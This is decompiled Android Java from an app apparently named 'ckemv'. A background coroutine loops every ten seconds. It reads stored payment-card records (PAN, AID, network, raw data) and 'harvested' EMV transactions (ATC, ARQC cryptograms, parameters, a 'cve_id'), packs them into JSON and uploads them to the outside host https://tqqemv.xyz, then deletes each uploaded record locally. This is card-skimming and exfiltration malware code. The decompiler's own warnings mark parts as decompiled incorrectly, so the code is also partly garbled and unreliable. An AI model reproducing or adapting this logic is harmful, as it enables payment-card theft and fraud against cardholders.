package B2;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import e2.AbstractC0139v;
import e2.B;
import e2.InterfaceC0137t;
import java.util.ArrayList;
import java.util.Iterator;
import m0.z;
import org.json.JSONArray;
import org.json.JSONObject;
import xyz.happify.ckemv.CardRecord;
import xyz.happify.ckemv.HarvestedTx;
import xyz.happify.ckemv.MainActivity;
import xyz.happify.ckemv.Reporter;

/* loaded from: classes.dex */
public final class s extends Q1.g implements W1.p {

    /* renamed from: f, reason: collision with root package name */
    public String f96f;
    public Iterator g;
    public int h;

    /* renamed from: i, reason: collision with root package name */
    public final /* synthetic */ MainActivity f97i;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public s(MainActivity mainActivity, O1.d dVar) {
        super(2, dVar);
        this.f97i = mainActivity;
    }

    @Override // Q1.b
    public final O1.d b(O1.d dVar, Object obj) {
        return new s(this.f97i, dVar);
    }

    @Override // W1.p
    public final Object e(Object obj, Object obj2) {
        ((s) b((O1.d) obj2, (InterfaceC0137t) obj)).k(K1.h.f605a);
        return P1.a.f784b;
    }

    /* JADX WARN: Removed duplicated region for block: B:10:0x0187  */
    /* JADX WARN: Removed duplicated region for block: B:45:0x005b A[RETURN] */
    /* JADX WARN: Removed duplicated region for block: B:48:0x0060  */
    /* JADX WARN: Removed duplicated region for block: B:72:0x02bc  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:29:0x0286 -> B:6:0x0289). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:36:0x02a1 -> B:7:0x028e). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:61:0x0178 -> B:39:0x02a5). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:62:0x017a -> B:8:0x0181). Please report as a decompilation issue!!! */
    @Override // Q1.b
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object k(Object obj) {
        String str;
        a aVar;
        SQLiteDatabase sQLiteDatabase;
        s sVar = this;
        P1.a aVar2 = P1.a.f784b;
        int i3 = sVar.h;
        String str2 = "arqc";
        String str3 = "atc";
        String str4 = "network";
        String str5 = "aid";
        int i4 = 1;
        String str6 = "dbHelper";
        MainActivity mainActivity = sVar.f97i;
        if (i3 == 0) {
            z.m0(obj);
            sVar.f96f = null;
            sVar.g = null;
            sVar.h = i4;
            str = str6;
            if (AbstractC0139v.d(10000L, sVar) == aVar2) {
            }
            aVar = mainActivity.f5247A;
            if (aVar == null) {
            }
        } else if (i3 == 1) {
            z.m0(obj);
            str = "dbHelper";
            aVar = mainActivity.f5247A;
            if (aVar == null) {
            }
        } else {
            if (i3 != 2) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            Iterator it = sVar.g;
            String str7 = sVar.f96f;
            z.m0(obj);
            String str8 = "arqc";
            String str9 = "atc";
            String str10 = "network";
            String str11 = "dbHelper";
            P1.a aVar3 = aVar2;
            MainActivity mainActivity2 = mainActivity;
            String str12 = "aid";
            str5 = str12;
            MainActivity mainActivity3 = mainActivity2;
            P1.a aVar4 = aVar3;
            str4 = str10;
            int i5 = 1;
            if (it.hasNext()) {
                K1.c cVar = (K1.c) it.next();
                long longValue = ((Number) cVar.f600b).longValue();
                CardRecord cardRecord = (CardRecord) cVar.c;
                JSONObject jSONObject = new JSONObject();
                jSONObject.put("pan", cardRecord.getPan());
                jSONObject.put(str5, cardRecord.getAid());
                jSONObject.put(str4, cardRecord.getNetwork());
                jSONObject.put("tx_count", cardRecord.getTxs().size());
                try {
                } catch (Exception unused) {
                    jSONObject.put("raw_data", cardRecord.getRawData());
                }
                jSONObject.put("raw_data", new JSONObject(cardRecord.getRawData()));
                JSONArray jSONArray = new JSONArray();
                Iterator<HarvestedTx> it2 = cardRecord.getTxs().iterator();
                while (it2.hasNext()) {
                    HarvestedTx next = it2.next();
                    JSONObject jSONObject2 = new JSONObject();
                    Iterator<HarvestedTx> it3 = it2;
                    String str13 = str4;
                    jSONObject2.put(str9, next.getAtc());
                    jSONObject2.put(str8, next.getArqc());
                    String str14 = str5;
                    jSONObject2.put("time_ms", next.getTimeMs());
                    jSONObject2.put("cve_id", next.getCve_id());
                    try {
                        jSONObject2.put("params", new JSONObject(next.getParams()));
                    } catch (Exception unused2) {
                        jSONObject2.put("params", next.getParams());
                    }
                    jSONArray.put(jSONObject2);
                    str5 = str14;
                    it2 = it3;
                    str4 = str13;
                }
                str10 = str4;
                str12 = str5;
                jSONObject.put("harvested_txs", jSONArray);
                Reporter reporter = Reporter.INSTANCE;
                String jSONObject3 = jSONObject.toString();
                X1.g.d(jSONObject3, "toString(...)");
                if (d2.l.V(reporter.uploadHarvestData(jSONObject3, str7, "https://tqqemv.xyz"), "Success", false)) {
                    mainActivity2 = mainActivity3;
                    a aVar5 = mainActivity2.f5247A;
                    if (aVar5 == null) {
                        X1.g.h(str11);
                        throw null;
                    }
                    aVar5.a(longValue);
                    a aVar6 = mainActivity2.f5247A;
                    if (aVar6 == null) {
                        X1.g.h(str11);
                        throw null;
                    }
                    aVar6.getWritableDatabase().execSQL("UPDATE stats SET total_scans = total_scans + 1 WHERE id = 1");
                    l2.d dVar = B.f2767a;
                    f2.d dVar2 = j2.o.f3534a;
                    r rVar = new r(mainActivity2, null);
                    this.f96f = str7;
                    this.g = it;
                    this.h = 2;
                    Object p3 = AbstractC0139v.p(dVar2, rVar, this);
                    aVar3 = aVar4;
                    if (p3 == aVar3) {
                        return aVar3;
                    }
                    str5 = str12;
                    MainActivity mainActivity32 = mainActivity2;
                    P1.a aVar42 = aVar3;
                    str4 = str10;
                    int i52 = 1;
                    if (it.hasNext()) {
                    }
                } else {
                    str5 = str12;
                    str4 = str10;
                    int i522 = 1;
                    if (it.hasNext()) {
                    }
                }
            }
            sVar = this;
            i4 = i522;
            str6 = str11;
            aVar2 = aVar42;
            mainActivity = mainActivity32;
            str3 = str9;
            str2 = str8;
            sVar.f96f = null;
            sVar.g = null;
            sVar.h = i4;
            str = str6;
            if (AbstractC0139v.d(10000L, sVar) == aVar2) {
                return aVar2;
            }
            aVar = mainActivity.f5247A;
            if (aVar == null) {
                X1.g.h(str);
                throw null;
            }
            String i6 = aVar.i();
            if (i6 == null) {
                i6 = "no-key";
            }
            a aVar7 = mainActivity.f5247A;
            if (aVar7 == null) {
                X1.g.h(str);
                throw null;
            }
            ArrayList arrayList = new ArrayList();
            SQLiteDatabase readableDatabase = aVar7.getReadableDatabase();
            String str15 = i6;
            str11 = str;
            Cursor rawQuery = readableDatabase.rawQuery("SELECT * FROM cards ORDER BY id ASC", null);
            if (rawQuery.moveToFirst()) {
                while (true) {
                    long j3 = rawQuery.getLong(rawQuery.getColumnIndexOrThrow("id"));
                    String string = rawQuery.getString(rawQuery.getColumnIndexOrThrow("pan"));
                    String string2 = rawQuery.getString(rawQuery.getColumnIndexOrThrow(str5));
                    String string3 = rawQuery.getString(rawQuery.getColumnIndexOrThrow(str4));
                    String string4 = rawQuery.getString(rawQuery.getColumnIndexOrThrow("raw_data"));
                    ArrayList arrayList2 = new ArrayList();
                    aVar42 = aVar2;
                    Cursor rawQuery2 = readableDatabase.rawQuery("SELECT * FROM transactions WHERE card_id = ?", new String[]{String.valueOf(j3)});
                    if (rawQuery2.moveToFirst()) {
                        while (true) {
                            sQLiteDatabase = readableDatabase;
                            String string5 = rawQuery2.getString(rawQuery2.getColumnIndexOrThrow(str3));
                            mainActivity32 = mainActivity;
                            X1.g.d(string5, "getString(...)");
                            str9 = str3;
                            String string6 = rawQuery2.getString(rawQuery2.getColumnIndexOrThrow(str2));
                            X1.g.d(string6, "getString(...)");
                            str8 = str2;
                            double d3 = rawQuery2.getDouble(rawQuery2.getColumnIndexOrThrow("time_ms"));
                            String string7 = rawQuery2.getString(rawQuery2.getColumnIndexOrThrow("params"));
                            X1.g.d(string7, "getString(...)");
                            arrayList2.add(new HarvestedTx(string5, string6, d3, string7, rawQuery2.getInt(rawQuery2.getColumnIndexOrThrow("cve_id"))));
                            if (!rawQuery2.moveToNext()) {
                                break;
                            }
                            readableDatabase = sQLiteDatabase;
                            mainActivity = mainActivity32;
                            str3 = str9;
                            str2 = str8;
                        }
                    } else {
                        mainActivity32 = mainActivity;
                        str8 = str2;
                        str9 = str3;
                        sQLiteDatabase = readableDatabase;
                    }
                    rawQuery2.close();
                    Long valueOf = Long.valueOf(j3);
                    X1.g.b(string);
                    X1.g.b(string2);
                    X1.g.b(string3);
                    X1.g.b(string4);
                    arrayList.add(new K1.c(valueOf, new CardRecord(string, string2, string3, string4, arrayList2)));
                    if (!rawQuery.moveToNext()) {
                        break;
                    }
                    aVar2 = aVar42;
                    readableDatabase = sQLiteDatabase;
                    mainActivity = mainActivity32;
                    str3 = str9;
                    str2 = str8;
                }
            } else {
                aVar42 = aVar2;
                mainActivity32 = mainActivity;
                str8 = str2;
                str9 = str3;
            }
            rawQuery.close();
            i522 = 1;
            if (!arrayList.isEmpty()) {
                it = arrayList.iterator();
                str7 = str15;
                if (it.hasNext()) {
                }
            }
            sVar = this;
            i4 = i522;
            str6 = str11;
            aVar2 = aVar42;
            mainActivity = mainActivity32;
            str3 = str9;
            str2 = str8;
            sVar.f96f = null;
            sVar.g = null;
            sVar.h = i4;
            str = str6;
            if (AbstractC0139v.d(10000L, sVar) == aVar2) {
            }
            aVar = mainActivity.f5247A;
            if (aVar == null) {
            }
        }
    }
}
